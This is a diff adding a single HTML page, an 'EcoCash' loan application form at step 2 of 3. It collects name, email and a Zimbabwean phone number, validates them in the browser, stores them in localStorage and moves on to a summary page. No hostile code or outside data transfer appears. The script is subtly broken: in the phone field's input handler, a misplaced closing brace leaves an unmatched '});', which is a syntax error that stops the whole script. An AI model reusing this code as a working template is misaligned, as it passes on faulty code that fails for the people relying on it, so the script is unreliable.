@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Loan Application</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+        
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .logo-eco {
+            color: #0066ff;
+        }
+        
+        .logo-cash {
+            color: #ff0000;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            flex: 1;
+            margin-bottom: 10px;
+            max-height: calc(100vh - 140px);
+        }
+        
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 66%;
+            height: 100%;
+            background: linear-gradient(to right, #4361ee, #7209b7);
+        }
+        
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .name-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 24px;
+        }
+        
+        .name-group>div {
+            flex: 1;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .form-input:focus {
+            border-color: #4361ee;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.15);
+        }
+        
+        .invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.15) !important;
+        }
+        
+        .phone-group {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 0 16px;
+            margin-bottom: 6px;
+            transition: border 0.3s, box-shadow 0.3s;
+        }
+        
+        .phone-group:focus-within {
+            border-color: #4361ee;
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.15);
+        }
+        
+        .phone-group.invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.15) !important;
+        }
+        
+        .phone-prefix {
+            color: #666;
+            font-size: 16px;
+            margin-right: 10px;
+            font-weight: 600;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 16px 0;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            background: transparent;
+        }
+        
+        .phone-hint {
+            color: #999;
+            display: block;
+            margin-bottom: 30px;
+            font-size: 13px;
+        }
+        
+        .error-text {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: -18px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        
+        .error-text.show {
+            display: block;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .prev-btn {
+            background: #eee;
+            color: #666;
+        }
+        
+        .prev-btn:hover {
+            background: #ddd;
+            transform: scale(1.02);
+        }
+        
+        .prev-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .next-btn {
+            background: linear-gradient(to right, #4361ee, #7209b7);
+            color: white;
+        }
+        
+        .next-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(67, 97, 238, 0.4);
+        }
+        
+        .next-btn:active {
+            transform: scale(0.98);
+        }
+        
+        footer {
+            padding: 20px;
+            color: #aaa;
+            font-size: 13px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 25px 18px;
+            }
+            .form-title {
+                font-size: 24px;
+            }
+            .name-group {
+                flex-direction: column;
+                gap: 0;
+            }
+            .name-group>div {
+                margin-bottom: 24px;
+            }
+            .name-group>div:last-child {
+                margin-bottom: 0;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="history.back()" aria-label="Go back">←</button>
+        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div></div>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">Loan Application</h1>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Step 2 of 3</div>
+
+        <div class="name-group">
+            <div>
+                <label class="form-label">First Name</label>
+                <input type="text" class="form-input" id="firstName" placeholder="John">
+                <div class="error-text" id="firstNameError">Please enter your first name.</div>
+            </div>
+            <div>
+                <label class="form-label">Last Name</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                <div class="error-text" id="lastNameError">Please enter your last name.</div>
+            </div>
+        </div>
+
+        <label class="form-label">Email Address</label>
+        <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:6px;">
+        <div class="error-text" id="emailError">Please enter a valid email address.</div>
+
+        <label class="form-label" style="margin-top:18px;">Phone Number</label>
+        <div class="phone-group" id="phoneGroup">
+            <span class="phone-prefix">+263</span>
+            <input type="tel" class="phone-input" id="phone" placeholder="771234567" maxlength="9">
+        </div>
+        <div class="error-text" id="phoneError">Please enter exactly 9 digits (e.g. 771234567).</div>
+        <small class="phone-hint">Enter 9 digits (e.g. 771234567)</small>
+
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
+    </main>
+
+    <footer>© 2026 EcoCash</footer>
+
+    <script>
+        // Pre-fill from localStorage
+        const fields = ['firstName', 'lastName', 'email', 'phone'];
+        fields.forEach(field => {
+            const val = localStorage.getItem(field);
+            if (val) document.getElementById(field).value = val;
+        });
+
+        // Error elements
+        const firstNameError = document.getElementById('firstNameError');
+        const lastNameError = document.getElementById('lastNameError');
+        const emailError = document.getElementById('emailError');
+        const phoneError = document.getElementById('phoneError');
+
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            // Reset invalid styles and errors
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
+            [firstNameError, lastNameError, emailError, phoneError].forEach(el => el.classList.remove('show'));
+
+            let valid = true;
+
+            // Validate first name
+            if (!firstName || firstName.length < 2) {
+                document.getElementById('firstName').classList.add('invalid');
+                firstNameError.classList.add('show');
+                valid = false;
+            }
+
+            // Validate last name
+            if (!lastName || lastName.length < 2) {
+                document.getElementById('lastName').classList.add('invalid');
+                lastNameError.classList.add('show');
+                valid = false;
+            }
+
+            // Validate email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!email || !emailRegex.test(email)) {
+                document.getElementById('email').classList.add('invalid');
+                emailError.classList.add('show');
+                valid = false;
+            }
+
+            // Validate phone (exactly 9 digits)
+            if (!phone || phone.length !== 9 || !/^\d{9}$/.test(phone)) {
+                document.getElementById('phoneGroup').classList.add('invalid');
+                phoneError.classList.add('show');
+                valid = false;
+            }
+
+            if (!valid) {
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstError.focus();
+                }
+                return;
+            }
+
+            // Save to localStorage
+            localStorage.setItem('firstName', firstName);
+            localStorage.setItem('lastName', lastName);
+            localStorage.setItem('email', email);
+            localStorage.setItem('phone', phone);
+
+            // Go to summary
+            window.location.href = 'summary.html';
+        });
+
+        // Real-time validation
+        document.getElementById('firstName').addEventListener('input', function() {
+            if (this.value.trim().length >= 2) {
+                this.classList.remove('invalid');
+                firstNameError.classList.remove('show');
+            }
+        });
+
+        document.getElementById('lastName').addEventListener('input', function() {
+            if (this.value.trim().length >= 2) {
+                this.classList.remove('invalid');
+                lastNameError.classList.remove('show');
+            }
+        });
+
+        document.getElementById('email').addEventListener('input', function() {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (emailRegex.test(this.value.trim())) {
+                this.classList.remove('invalid');
+                emailError.classList.remove('show');
+            }
+        });
+
+        document.getElementById('phone').addEventListener('input', function() {
+            // Remove non-digits
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length > 9) this.value = this.value.slice(0, 9);
+            
+                document.getElementById('phoneGroup').classList.remove('invalid');
+                phoneError.classList.remove('show');
+            }
+        });
+    </script>
+</body>
+
+</html>
